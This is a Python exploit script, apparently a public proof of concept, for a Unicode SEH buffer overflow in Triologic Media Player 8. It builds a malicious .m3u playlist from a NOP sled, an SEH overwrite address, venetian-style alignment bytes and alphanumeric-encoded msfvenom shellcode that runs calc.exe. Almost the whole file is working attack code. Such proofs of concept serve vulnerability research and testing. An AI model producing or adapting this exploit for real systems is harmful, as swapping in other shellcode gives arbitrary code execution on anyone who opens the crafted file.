#!/usr/local/env python

#
# Triologic Media Player 8 - Unicode Buffer Overflow [SEH]
# 
# 0x004100f2 : pop esi # pop ebx # ret 0x04 | triomp8.exe
# msfvenom -p windows/exec CMD=calc.exe -f raw
# SkyLined's encoder alpha2: ./alpha2 eax --unicode --uppercase
# Tested On: Windows XP SP3 using Immunity dbg and mona.py plugin
#

shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLJH3RKPKPM0C0TIY
UNQWPS4TKPPNP4K0RLLTKR2N4DKRRO8LOX7PJNFNQKO6LOLS1CLKRNLMPWQXOLMKQY7K2ZRQBPWTKPRLP4KPJOLTKPLN1BXYSQ8KQXQ0Q4KPYO0KQJ3TKQ9MH9SNZOYTKODDKKQIFNQKO6LY1HOLMM1WW08YP
CEZVM33MZXOKCMMTSEK4R8TKPXO4KQJ31V4KLLPKTK28MLKQXS4KLD4KKQHPE9Q4NDO41K1KQQR9QJ21KOK0QOQOQJTKMBJK4MQMBJM1DMU5H2KPM0M0PP38NQDKROSWKOYE7KZP7EURQFRHEVTU7M5MKO9EO
LKVSLLJ3PKKK0SEKUWKOWLST22OQZKP23KOYEC31Q2LRCNNQU2XS5M0A"

allign=(
	"\x55"		# push ebp
	"\x71"		# venetian
	"\x58"		# pop eax
	"\x71"		# venetian
	"\x05\x29\x22"	# add eax, 0x22002900
	"\x71"		# venetian
	"\x2d\x21\x22"	# sub eax, 0x22002100
	"\x71"		# venetian
	"\x50"		# push eax
	"\x71"		# venetian
	"\xc3"		# ret
	)

payload="\x90"*536+"\x41\x71"+"\xf2\x41"+"\x90"+allign+"A"*64+shellcode+"A"*(633-len(shellcode))

flnm='expl.m3u'

textfile=open(flnm,'w')
textfile.write(payload)
textfile.close()
